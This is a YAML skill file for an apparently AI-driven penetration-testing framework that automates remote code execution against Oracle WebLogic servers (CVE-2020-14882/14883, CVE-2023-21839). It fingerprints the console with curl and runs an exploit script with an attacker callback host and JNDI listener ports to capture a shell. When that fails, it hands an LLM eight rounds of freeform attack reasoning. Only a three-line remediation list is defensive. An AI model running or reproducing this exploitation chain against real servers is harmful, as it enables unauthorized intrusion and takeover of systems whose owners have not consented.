skill_id: weblogic_jndi_rce
name: "WebLogic 多 CVE RCE (14882/14883/21839)"
category: web_rce
phase: foothold
version: "3.0"

match:
  rules:
    - fingerprint_contains: ["weblogic"]
    - fingerprint_contains: ["WebLogic"]
    - evidence_contains: ["weblogic"]
    - evidence_contains: ["WebLogic"]
    - cve_matches: ["CVE-2023-21839"]
    - cve_matches: ["CVE-2020-14882"]
    - cve_matches: ["CVE-2020-14883"]
    - cve_matches: ["CVE-2020-2551"]
    - cve_matches: ["CVE-2018-2894"]

probes:
  - id: confirm_weblogic
    description: "确认 WebLogic Console + T3 协议"
    steps:
      - command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "BASE_URL:$BASE"
          code=$(curl -s -o /dev/null -w "%{http_code}" \
            "$BASE/console/login/LoginForm.jsp" --max-time 10 2>/dev/null)
          echo "CONSOLE_STATUS:$code"
          if [ "$code" = "200" ] || [ "$code" = "302" ]; then
            echo "WEBLOGIC_CONFIRMED"
          fi
          resp=$(curl -s "$BASE/" --max-time 10 2>/dev/null)
          if echo "$resp" | grep -qi "WebLogic\|Oracle"; then
            echo "WEBLOGIC_CONFIRMED"
          fi
        parse_rules:
          - if_contains: ["WEBLOGIC_CONFIRMED"]
            set: { weblogic_confirmed: true }

exploit_paths:
  - path_id: weblogic_script
    name: "weblogic_exploit.py 多 CVE 利用"
    priority: 1
    conditions:
      weblogic_confirmed: true
    steps:
      - id: run_exploit
        description: "CVE-2020-14883 HTTP RCE + CVE-2023-21839 T3 JNDI"
        publish_ports: [1389, 8888, 8889, 39878]
        command: |
          python3 {skill_dir}/scripts/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} \
            --lhost "$LHOST" 2>&1
        timeout: 240
        success_criteria:
          stdout_contains_any: ["WEBLOGIC_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_weblogic"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 8
    conditions:
      weblogic_confirmed: true

remediation: |
  1. 升级 WebLogic 至最新 CPU 补丁
  2. 禁用 T3 协议或限制访问源 IP
  3. 限制 /console 访问（ACL/WAF）
